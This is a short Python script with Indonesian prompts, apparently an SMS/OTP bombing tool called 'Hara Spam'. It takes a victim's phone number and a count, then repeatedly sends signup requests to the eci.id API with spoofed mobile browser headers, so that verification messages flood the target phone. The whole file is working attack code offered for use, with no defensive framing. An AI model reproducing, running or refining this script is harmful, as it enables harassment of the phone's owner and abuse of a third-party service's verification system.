import requests
import time

def hara_spam():
    print("=======================")
    print("     Hara Spam ;)     ")
    print("=======================")
    print("Masukkan nomor tujuan dan jumlah spam.")
    print("Contoh nomor: 089XXXXXXXX")
    print("=======================\n")
    
    nomor = input("Masukkan nomor tujuan: ")
    jumlah = int(input("Masukkan jumlah spam: "))

    headers = {
        "Host": "eci.id",
        "Connection": "keep-alive",
        "Content-Length": "40",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "Origin": "https://eci.id",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": f"https://eci.id/verification?step=1&phone={nomor}",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }

    data = {"phone": nomor}

    url = "https://eci.id/api/signup"  # Ganti dengan URL yang benar
    success_count = 0

    for i in range(jumlah):
        try:
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200:
                print(f"[*] Spam {i+1} ke {nomor} berhasil terkirim.")
                success_count += 1
            else:
                print(f"[x] Spam {i+1} gagal. Error {response.status_code}.")
            time.sleep(1)  # Tunggu 1 detik sebelum spam berikutnya
        except Exception as e:
            print(f"[x] Error: {str(e)}")
            break

    print("\n=======================")
    print(f"Spam selesai! Total berhasil: {success_count} dari {jumlah}")
    print("=======================")

if __name__ == "__main__":
    hara_spam()
